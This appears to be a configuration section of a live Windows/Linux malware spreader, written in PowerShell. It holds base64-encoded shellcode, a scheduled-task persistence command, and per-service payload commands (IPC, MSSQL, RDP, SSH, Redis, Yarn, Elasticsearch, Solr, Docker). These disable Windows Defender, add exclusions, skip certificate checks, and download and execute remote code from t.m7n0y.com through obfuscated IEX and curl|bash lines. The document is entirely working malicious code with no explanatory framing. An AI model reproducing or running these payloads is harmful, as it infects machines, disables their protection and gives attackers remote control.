$sc=[Convert]::FromBase64String("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")

$sco=[Convert]::FromBase64String("McBAD4StBAAAYOgAAAAAW+gjAAAAuXYBAAAPMo17OTn4dBE5RQB0BolFAIlVCIn4MdIPMGHCJACNqwAQAADB7QzB5QyD7VDDuSMAAABqMA+hjtmOwWSLDUAAAACLYQRRnGDoAAAAAFvoy////4tFAIPAF4lEJCQxwJlC8A+wVQh1Erl2AQAAmYtFAA8w++gEAAAA+mGdw4tFAMHoDMHgDC0AEAAAZoE4TVp19IlFBLh4fPTb6LcAAACXuD9fZHdX6KsAAAAp+InBPXABAAB1A4PACI1YHI00H2ShJAEAAIs2ifIpwoH6AAQAAHfyUrjhFAEX6H8AAACLQAqNUASNNA/orwAAAD1aavrBdA492IPgPnQHizwXKdfr44l9DI0cH411EF+LWwQxwFVqAVVQ6AAAAACBBCSSAAAAUFMpPCRWuMRcGW3oJQAAADHAUFBQVrg0Rsyv6BUAAACFwHTGi0UcgHgOAXQHiQCJQATrtsPoAgAAAP/gYIttBJeLRTyLVAV4AeqLShiLWiAB60mLNIsB7ugdAAAAOfh18YtaJAHrZosMS4taHAHriwSLAeiJRCQcYcNSMcCZrMHKDQHChcB19pJaw1iJRCQQWFlYWmBSUYsoMcBkoiQAAACZsEBQweAGUFRSiRFRSlK46pluV+h7////hcB1T1iLOOgAAAAAXoPGVbkABAAA86SLRQxQuEi4GLjoVv///4tADItAFIsAZoN4JBh194tQKIF6DDMAMgB164tYEIldBLheUV6D6DL///9ZiQExwIhFCEBkoiQAAABhw1pYWFlRUVHoAAAAAIMEJAlRUVL/4PzoggAAAGCJ5THAZItQMItSDItSFItyKA+3SiYx/6w8YXwCLCDBzw0Bx+LyUleLUhCLSjyLTBF440gB0VGLWSAB04tJGOM6SYs0iwHWMf+swc8NAcc44HX2A334O30kdeRYi1gkAdNmiwxLi1gcAdOLBIsB0IlEJCRbW2FZWlH/4F9fWosS641dagGNhbIAAABQaDGLb4f/1bvgHSoKaKaVvZ3/1TwGfAqA++B1BbtHE3JvagBT/9VjbWQgL2Mgc2NodGFza3MgL2NyZWF0ZSAvcnUgc3lzdGVtIC9zYyBNSU5VVEUgL21vIDEyMCAvdG4gUnRzYSAvdHIgInBvd2Vyc2hlbGwgLWMgJ1tOZXQuU2VydmljZVBvaW50TWFuYWdlcl06OlNlcnZlckNlcnRpZmljYXRlVmFsaWRhdGlvbkNhbGxiYWNrPXsxfTtJRVgoTmVgdy1PYmpgZWN0IE5ldC5XZWJDYGxpZW50KS5cXFwiRG93bmxvYWRTdHJpbmdcXFwiKFxcXCJodHRwczovL3QubTduMHkuY29tL2Viby5qc3A/Mi4wKiVjb21wdXRlcm5hbWUlXFxcIiknIiAvRiAmIGVjaG8gJXBhdGglfGZpbmRzdHIgL2kgcG93ZXJzaGVsbD5udWwgfHwgKHNldHggcGF0aCAiJXBhdGglO2M6XHdpbmRvd3Ncc3lzdGVtMzJcV2luZG93c1Bvd2Vyc2hlbGxcdjEuMCIgL20pICYgc2NodGFza3MgL3J1biAvdG4gUnRzYQAKVeguAAAAuYIAAMAPMkyNDTQAAABEOch0GTlFAHQKiVUEiUUAxkX4AEmRUFpIweogDzBdw0iNLQAQAABIwe0MSMHlDEiD7XDDDwH4ZUiJJCUQAAAAZUiLJCWoAQAAaitl/zQlEAAAAFBQVejF////SItFAEiDwB9IiUQkEFFSQVBBUUFSQVMxwLIB8A+wVfh1FLmCAADAi0UAi1UEDzD76A4AAAD6QVtBWkFZQVhaWV1Yw0FXQVZXVlNQTIt9AEnB7wxJwecMSYHvABAAAGZBgT9NWnXxTIl9CGVMizQliAEAAL94fPTb6OwAAABIkb8/X2R36OcAAACLQAOJwz0ABAAAcgODwBBIjVAoTI0EEU2JwU2LCU05yA+EsQAAAEyJyEwp8Eg9AAcAAHfmTSnOv+EUARfopgAAAIt4A4PHCEiNNBno3wAAAD1aavrBdBA92IPgPnQJSIsMOUgp+evgv0i4GLjobwAAAEiJRfBIjTQRSInzSItbCEg53nT3SI1NEE0xwEyNDa0AAABVagFVQVBKjRQzSIPsIL/EXBlt6DUAAABIjU0QTTHJvzRGzK/oJAAAAEiDxECFwHS4SItFIIB4GgF0CUiJAEiJQAjrpVhbXl9BXkFfw+gCAAAA/+BTUVZBi0c8QYuEB4gAAABMAfhQi0gYi1ggTAH7/8mLNItMAf7oHwAAADn4de9Yi1gkTAH7ZosMS4tYHEwB+4sEi0wB+F5ZW8NSMcCZrMHKDQHChcB19pJaw1VTV1ZBV0mLKEyLfQhSXkyJyzHARA8iwEiJAonBSPfRSYnAsEBQweAGUEmJAUiD7CC/6pluV+hl////SIPEMIXAdUVIiz5IjTVNAAAAuQAGAADzpEiLRfBIi0AYSItAIEiLAGaDeEgYdfZIi1BQgXoMMwAyAHXpTIt4IL9eUV6D6CL///9IiQMxyYhN+LEBRA8iwUFfXl9bXcNIkjHJUVFJiclMjQUNAAAAicpIg+wg/9BIg8Qww/xIg+Tw6MAAAABBUUFQUlFWSDHSZUiLUmBIi1IYSItSIEiLclBID7dKSk0xyUgxwKw8YXwCLCBBwckNQQHB4u1SQVFIi1Igi0I8SAHQi4CIAAAASIXAdGdIAdBQi0gYRItAIEkB0ONWSP/JQYs0iEgB1k0xyUgxwKxBwckNQQHBOOB18UwDTCQIRTnRddhYRItAJEkB0GZBiwxIRItAHEkB0EGLBIhIAdBBWEFYXllaQVhBWUFaSIPsIEFS/+BYQVlaSIsS6Vf///9dSLoBAAAAAAAAAEiNjQEBAABBujGLb4f/1bvgHSoKQbqmlb2d/9VIg8QoPAZ8CoD74HUFu0cTcm9qAFlBidr/1WNtZCAvYyBzY2h0YXNrcyAvY3JlYXRlIC9ydSBzeXN0ZW0gL3NjIE1JTlVURSAvbW8gMTIwIC90biBSdHNhIC90ciAicG93ZXJzaGVsbCAtYyAnW05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VydmVyQ2VydGlmaWNhdGVWYWxpZGF0aW9uQ2FsbGJhY2s9ezF9O0lFWChOZWB3LU9iamBlY3QgTmV0LldlYkNgbGllbnQpLlxcXCJEb3dubG9hZFN0cmluZ1xcXCIoXFxcImh0dHBzOi8vdC5tN24weS5jb20vZWJvLmpzcD8yLjAqJWNvbXB1dGVybmFtZSVcXFwiKSciIC9GICYgZWNobyAlcGF0aCV8ZmluZHN0ciAvaSBwb3dlcnNoZWxsPm51bCB8fCAoc2V0eCBwYXRoICIlcGF0aCU7Yzpcd2luZG93c1xzeXN0ZW0zMlxXaW5kb3dzUG93ZXJzaGVsbFx2MS4wIiAvbSkgJiBzY2h0YXNrcyAvcnVuIC90biBSdHNhAAo=")

$ipc_cmd='cmd /c powershell -e UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgADEAOwBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAYwA6AFwAOwBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAHIAbwBjAGUAcwBzACAAYwA6AFwAdwBpAG4AZABvAHcAcwBcAHMAeQBzAHQAZQBtADMAMgBcAFcAaQBuAGQAbwB3AHMAUABvAHcAZQByAFMAaABlAGwAbABcAHYAMQAuADAAXABwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUA & start /b powershell [Net.ServicePointManager]::ServerCertificateValidationCallback={1};IE`x(Ne`w-Obj`ect Net.WebC`lient).DownLoadString(''https://t.m7n''+''0y.com/7p.php?2.0*ipc*%username%*%computername%*''+[Environment]::OSVersion.version.Major);bpu (''https://t.m7n''+''0y.com/ipc.jsp?2.0'')'

$ipco_cmd='cmd /c powershell -e UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgADEAOwBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAYwA6AFwAOwBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAHIAbwBjAGUAcwBzACAAYwA6AFwAdwBpAG4AZABvAHcAcwBcAHMAeQBzAHQAZQBtADMAMgBcAFcAaQBuAGQAbwB3AHMAUABvAHcAZQByAFMAaABlAGwAbABcAHYAMQAuADAAXABwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUA & start /b powershell [Net.ServicePointManager]::ServerCertificateValidationCallback={1};IE`x(Ne`w-Obj`ect Net.WebC`lient).DownLoadString(''https://t.m7n''+''0y.com/7p.php?2.0*ipco*%username%*%computername%*''+[Environment]::OSVersion.version.Major);bpu (''https://t.m7n''+''0y.com/ipco.jsp?2.0'')'

$base_core='dHJ5eyhuZXcgQWN0aXZlWE9iamVjdCgiV1NjcmlwdC5TaGVsbCIpKS5SdW4oImNtZCAvYyBwb3dlcnNoZWxsIC1lIFV3QmxBSFFBTFFCTkFIQUFVQUJ5QUdVQVpnQmxBSElBWlFCdUFHTUFaUUFnQUMwQVJBQnBBSE1BWVFCaUFHd0FaUUJTQUdVQVlRQnNBSFFBYVFCdEFHVUFUUUJ2QUc0QWFRQjBBRzhBY2dCcEFHNEFad0FnQURFQU93QkJBR1FBWkFBdEFFMEFjQUJRQUhJQVpRQm1BR1VBY2dCbEFHNEFZd0JsQUNBQUxRQkZBSGdBWXdCc0FIVUFjd0JwQUc4QWJnQlFBR0VBZEFCb0FDQUFZd0E2QUZ3QU93QkJBR1FBWkFBdEFFMEFjQUJRQUhJQVpRQm1BR1VBY2dCbEFHNEFZd0JsQUNBQUxRQkZBSGdBWXdCc0FIVUFjd0JwQUc4QWJnQlFBSElBYndCakFHVUFjd0J6QUNBQVl3QTZBRndBZHdCcEFHNEFaQUJ2QUhjQWN3QmNBSE1BZVFCekFIUUFaUUJ0QURNQU1nQmNBRmNBYVFCdUFHUUFid0IzQUhNQVVBQnZBSGNBWlFCeUFGTUFhQUJsQUd3QWJBQmNBSFlBTVFBdUFEQUFYQUJ3QUc4QWR3QmxBSElBY3dCb0FHVUFiQUJzQUM0QVpRQjRBR1VBICYgcG93ZXJzaGVsbCBbTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZXJ2ZXJDZXJ0aWZpY2F0ZVZhbGlkYXRpb25DYWxsYmFjaz17MX07SUVgeChOZWB3LU9iamBlY3QgTmV0LldlYkNgbGllbnQpLkRvd25Mb2FkU3RyaW5nKCdodHRwczovL3QubTduJysnMHkuY29tLzdwLnBocD8yLjAqaXBjX2wqJXVzZXJuYW1lJSolY29tcHV0ZXJuYW1lJSonK1tFbnZpcm9ubWVudF06Ok9TVmVyc2lvbi52ZXJzaW9uLk1ham9yKTticHUgKCdodHRwczovL3QubTduJysnMHkuY29tL2lwYy5qc3A/bCoyLjAnKSIsMCxmYWxzZSk7fWNhdGNoKGUpe30='

$mssql_cmd='cmd /c powershell [Net.ServicePointManager]::ServerCertificateValidationCallback={1};IE`x(Ne`w-Obj`ect Net.WebC`lient).DownLoadString(''https://t.m7n''+''0y.com/ms.jsp?2.0*%computername%'')'

$mssqlo_cmd='cmd /c powershell [Net.ServicePointManager]::ServerCertificateValidationCallback={1};IE`x(Ne`w-Obj`ect Net.WebC`lient).DownLoadString(''https://t.m7n''+''0y.com/mso.jsp?2.0*%computername%'')'

$blue3_bin_b64=''

$blue6_bin_b64=''

$jsb64='CnZhciBjbWQgPW5ldyBBY3RpdmVYT2JqZWN0KCJXU2NyaXB0LlNoZWxsIik7dmFyIGNtZHN0cj0iY21kIC9jIHBvd2Vyc2hlbGwgLXcgaGlkZGVuIFtOZXQuU2VydmljZVBvaW50TWFuYWdlcl06OlNlcnZlckNlcnRpZmljYXRlVmFsaWRhdGlvbkNhbGxiYWNrPXsxfTtJRWB4KE5lYHctT2JqYGVjdCBOZXQuV2ViQ2BsaWVudCkuRG93bkxvYWRTdHJpbmcoJ2h0dHBzOi8vdC5tN24nKycweS5jb20vN3AucGhwPzIuMCp1c2JfanMqJXVzZXJuYW1lJSolY29tcHV0ZXJuYW1lJSonK1tFbnZpcm9ubWVudF06Ok9TVmVyc2lvbi52ZXJzaW9uLk1ham9yKTticHUgKCdodHRwczovL3QubTduJysnMHkuY29tL3VzYi5qc3A/anNfMi4wJykiO2NtZC5ydW4oY21kc3RyLDAsMSk7Cg=='

$batb64='CmNtZCAvYyBzdGFydCAvYiBwb3dlcnNoZWxsIC13IGhpZGRlbiBbTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZXJ2ZXJDZXJ0aWZpY2F0ZVZhbGlkYXRpb25DYWxsYmFjaz17MX07SUVgeChOZWB3LU9iamBlY3QgTmV0LldlYkNgbGllbnQpLkRvd25Mb2FkU3RyaW5nKCdodHRwczovL3QubTduJysnMHkuY29tLzdwLnBocD8yLjAqaXBjX2JhdColdXNlcm5hbWUlKiVjb21wdXRlcm5hbWUlKicrW0Vudmlyb25tZW50XTo6T1NWZXJzaW9uLnZlcnNpb24uTWFqb3IpO2JwdSAoJ2h0dHBzOi8vdC5tN24nKycweS5jb20vaXBjLmpzcD9iYXRfMi4wJykKY21kIC9jIGRlbCAlMAo='

$rdp_cmd='cmd /c powershell Set-MpPreference -DisableRealtimeMonitoring 1;Add-MpPreference -ExclusionProcess c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe&powershell [Net.ServicePointManager]::ServerCertificateValidationCallback={1};IEX(New-Object Net.WebClient).DownloadString(''https://t.m7n''+''0y.com/rdp.jsp?2.0'')'

$rdpo_cmd='cmd /c powershell Set-MpPreference -DisableRealtimeMonitoring 1;Add-MpPreference -ExclusionProcess c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe&powershell [Net.ServicePointManager]::ServerCertificateValidationCallback={1};IEX(New-Object Net.WebClient).DownloadString(''https://t.m7n''+''0y.com/rdpo.jsp?2.0'')'

$ssh_cmd='export src=ssh;curl -fksSL https://t.m7n0y.com/ln/core.png?ssh*2.0|bash'

$ssho_cmd='export src=ssho;curl -fksSL https://t.m7n0y.com/ln/core.png?ssho*2.0|bash'

$redis_cmd='export src=rds;curl -fksSL https://t.m7n0y.com/ln/core.png?rds*2.0|bash'

$rediso_cmd='export src=rdso;curl -fksSL https://t.m7n0y.com/ln/core.png?rdso*2.0|bash'

$smgh_cmd='cmd /c powershell Set-MpPreference -DisableRealtimeMonitoring 1;Add-MpPreference -ExclusionProcess c:/windows/system32/WindowsPowerShell/v1.0/powershell.exe;Add-MpPreference -ExclusionPath c:/ & powershell [Net.ServicePointManager]::ServerCertificateValidationCallback={1};IEx(New-Object Net.WebClient).DownLoadString(''https://t.m7n''+''0y.com/smgh.jsp?2.0*%computername%'')'

$smgho_cmd='cmd /c powershell Add-MpPreference -ExclusionProcess c:/windows/system32/WindowsPowerShell/v1.0/powershell.exe;Add-MpPreference -ExclusionPath c:/&powershell [Net.ServicePointManager]::ServerCertificateValidationCallback={1};IEx(New-Object Net.WebClient).DownLoadString(''https://t.m7n''+''0y.com/smgho.jsp?2.0*%computername%'')'

$yarn_cmd='export src=yarn;curl -fksSL https://t.m7n0y.com/ln/core.png?yarn*2.0|bash'

$yarno_cmd='export src=yarno;curl -fksSL https://t.m7n0y.com/ln/core.png?yarno*2.0|bash'

$logic_cmd='cmd /c powershell -e UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgADEAOwBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAYwA6AFwAOwBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAHIAbwBjAGUAcwBzACAAYwA6AFwAdwBpAG4AZABvAHcAcwBcAHMAeQBzAHQAZQBtADMAMgBcAFcAaQBuAGQAbwB3AHMAUABvAHcAZQByAFMAaABlAGwAbABcAHYAMQAuADAAXABwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUA & powershell [Net.ServicePointManager]::ServerCertificateValidationCallback={1};IE`x(Ne`w-Obj`ect Net.WebC`lient).DownLoadString(''https://t.m7n''+''0y.com/logic.jsp?2.0*%computername%'')','export src=logic;curl -fksSL https://t.m7n0y.com/ln/core.png?logic*2.0|bash'

$logico_cmd='cmd /c powershell -e UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgADEAOwBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAYwA6AFwAOwBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAHIAbwBjAGUAcwBzACAAYwA6AFwAdwBpAG4AZABvAHcAcwBcAHMAeQBzAHQAZQBtADMAMgBcAFcAaQBuAGQAbwB3AHMAUABvAHcAZQByAFMAaABlAGwAbABcAHYAMQAuADAAXABwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUA & powershell [Net.ServicePointManager]::ServerCertificateValidationCallback={1};IE`x(Ne`w-Obj`ect Net.WebC`lient).DownLoadString(''https://t.m7n''+''0y.com/logico.jsp?2.0*%computername%'')','export src=logico;curl -fksSL https://t.m7n0y.com/ln/core.png?logico*2.0|bash'

$es_cmd='cmd /c powershell -e UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgADEAOwBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAYwA6AFwAOwBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAHIAbwBjAGUAcwBzACAAYwA6AFwAdwBpAG4AZABvAHcAcwBcAHMAeQBzAHQAZQBtADMAMgBcAFcAaQBuAGQAbwB3AHMAUABvAHcAZQByAFMAaABlAGwAbABcAHYAMQAuADAAXABwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUA & powershell [Net.ServicePointManager]::ServerCertificateValidationCallback={1};IEx(New-Object Net.WebClient).DownLoadString(''https://t.m7n''+''0y.com/es.jsp?2.0*%computername%'')','export src=es;curl -fksSL https://t.m7n0y.com/ln/core.png?es*2.0|bash'

$eso_cmd='cmd /c powershell -e UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgADEAOwBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAYwA6AFwAOwBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAHIAbwBjAGUAcwBzACAAYwA6AFwAdwBpAG4AZABvAHcAcwBcAHMAeQBzAHQAZQBtADMAMgBcAFcAaQBuAGQAbwB3AHMAUABvAHcAZQByAFMAaABlAGwAbABcAHYAMQAuADAAXABwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUA & powershell [Net.ServicePointManager]::ServerCertificateValidationCallback={1};IEx(New-Object Net.WebClient).DownLoadString(''https://t.m7n''+''0y.com/eso.jsp?2.0*%computername%'')','export src=eso;curl -fksSL https://t.m7n0y.com/ln/core.png?eso*2.0|bash'

$solr_cmd='cmd /c powershell -e UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgADEAOwBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAYwA6AFwAOwBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAHIAbwBjAGUAcwBzACAAYwA6AFwAdwBpAG4AZABvAHcAcwBcAHMAeQBzAHQAZQBtADMAMgBcAFcAaQBuAGQAbwB3AHMAUABvAHcAZQByAFMAaABlAGwAbABcAHYAMQAuADAAXABwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUA & powershell [Net.ServicePointManager]::ServerCertificateValidationCallback={1};IEx(New-Object Net.WebClient).DownLoadString(''https://t.m7n''+''0y.com/solr.jsp?2.0*%computername%'')','export src=solr;curl -fksSL https://t.m7n0y.com/ln/core.png?solr*2.0|bash'

$solro_cmd='cmd /c powershell -e UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgADEAOwBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAYwA6AFwAOwBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAHIAbwBjAGUAcwBzACAAYwA6AFwAdwBpAG4AZABvAHcAcwBcAHMAeQBzAHQAZQBtADMAMgBcAFcAaQBuAGQAbwB3AHMAUABvAHcAZQByAFMAaABlAGwAbABcAHYAMQAuADAAXABwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUA & powershell [Net.ServicePointManager]::ServerCertificateValidationCallback={1};IEx(New-Object Net.WebClient).DownLoadString(''https://t.m7n''+''0y.com/solro.jsp?2.0*%computername%'')','export src=solro;curl -fksSL https://t.m7n0y.com/ln/core.png?solro*2.0|bash'

$docker_cmd='export src=docker;curl -fksSL https://t.m7n0y.com/ln/core.png?docker*2.0|bash'

$dockero_cmd='export src=dockero;curl -fksSL https://t.m7n0y.com/ln/core.png?dockero*2.0|bash'

$core_url='https://t.m7n0y.com'

try{$VVERSION=$ifmd5[0..5]-join""}catch{}

[Net.ServicePointManager]::ServerCertificateValidationCallback={1}

if(!$down_url){$down_url='https://d.bb3u9.com'}

